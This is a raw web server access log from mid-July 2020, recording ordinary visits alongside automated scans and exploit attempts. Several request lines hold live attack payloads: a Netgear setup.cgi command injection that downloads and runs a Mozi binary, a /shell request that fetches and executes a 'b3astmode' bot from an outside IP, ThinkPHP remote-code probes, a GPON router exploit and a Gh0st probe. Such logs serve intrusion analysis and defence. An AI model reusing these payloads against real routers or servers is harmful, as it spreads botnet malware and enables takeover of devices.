- - [15/Jul/2020:08:01:55 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [15/Jul/2020:08:41:45 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [15/Jul/2020:09:01:53 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [15/Jul/2020:09:49:52 +0000] "GET / HTTP/1.0" 200 2406 "-" - "-"
- - [15/Jul/2020:10:02:32 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [15/Jul/2020:11:02:26 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [15/Jul/2020:12:02:32 +0000] "GET / HTTP/1.1" 200 1309 "-" - "HomeNet/1.0"
- - [15/Jul/2020:12:21:39 +0000] "GET /TP/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:12:21:45 +0000] "GET / HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:15:05:20 +0000] "Gh0st\xad" 400 0 "-" - "-"
- - [15/Jul/2020:16:16:05 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [15/Jul/2020:16:16:06 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [15/Jul/2020:16:16:44 +0000] "GET /TP/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:47 +0000] "GET /TP/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:49 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:51 +0000] "GET /html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:51 +0000] "GET /public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:54 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:55 +0000] "GET /elrekt.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:55 +0000] "GET /index.php HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:56 +0000] "GET /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:16:57 +0000] "POST /index.php?s=captcha HTTP/1.1" 200 1272 "-" - "Go-http-client/1.1"
- - [15/Jul/2020:16:16:57 +0000] "GET / HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [15/Jul/2020:16:49:40 +0000] "GET / HTTP/1.1" 200 2387 "-" - "-"
- - [15/Jul/2020:18:29:16 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1872 "-" - "Hello, World"
- - [15/Jul/2020:19:09:55 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
- - [15/Jul/2020:19:29:57 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [15/Jul/2020:21:12:18 +0000] "GET / HTTP/1.0" 200 2406 "-" - "-"
- - [15/Jul/2020:22:53:09 +0000] "GET / HTTP/1.1" 200 3970 "-" - "-"
- - [15/Jul/2020:22:53:10 +0000] "GET / HTTP/1.1" 200 2807 "-" - "Mozilla/5.0 zgrab/0.x"
- - [16/Jul/2020:00:37:36 +0000] "GET / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
- - [16/Jul/2020:04:47:13 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [16/Jul/2020:04:47:14 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
